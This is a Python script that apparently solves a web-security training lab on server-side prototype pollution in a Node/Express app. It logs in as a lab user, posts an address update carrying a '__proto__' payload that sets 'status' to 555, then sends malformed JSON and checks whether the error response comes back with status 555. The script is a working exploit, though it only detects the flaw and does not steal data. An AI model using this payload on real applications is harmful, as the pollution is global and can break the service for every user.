import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession
from bs4 import BeautifulSoup

lab = LabSession()

# NOTE ON PERSISTENT POLLUTION:
# server-side prototype pollution is global and sticky - it affects every object,
# request, and user until the Node process restarts. testing this lab can leave
# the prototype in a state where Express parses every body as JSON, which breaks
# the normal form-encoded login (it starts throwing "500 Unexpected csrf=").
# so we log in with a JSON body, which works whether the app is clean or polluted.
csrf = BeautifulSoup(lab.get("/login").text, "html.parser").find("input", {"name": "csrf"})["value"]
lab.info("Logging in as wiener (JSON body)...")
lab.session.post(lab.url("/login"), json={"csrf": csrf, "username": "wiener", "password": "peter"})

# no polluted property is reflected here, so we detect pollution by a behavior
# change: the "status" property, which Express reads when building an error
# response.

# step 1: pollute Object.prototype.status with an unmistakable value (valid JSON
# so the merge actually runs)
address = {
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": lab.session.cookies.get("session"),
    "__proto__": {"status": 555},
}
lab.info("Polluting Object.prototype.status = 555...")
lab.session.post(lab.url("/my-account/change-address"), json=address)

# step 2: force a parse error with malformed JSON (separate request - a broken
# body never reaches the merge, so it must not carry the pollution itself). the
# error handler reads the inherited status, returning 555 instead of 500.
lab.info("Sending malformed JSON to trigger an error response...")
resp = lab.session.post(
    lab.url("/my-account/change-address"),
    data='{"address_line_1": "x" BROKEN',
    headers={"Content-Type": "application/json"},
)
lab.info(f"Error response status code: {resp.status_code}")
if resp.status_code == 555:
    lab.success("Got 555 - prototype pollution confirmed (status gadget)")
else:
    lab.warn(f"Expected 555, got {resp.status_code} (prototype may already be polluted from prior runs)")

lab.check_solved()
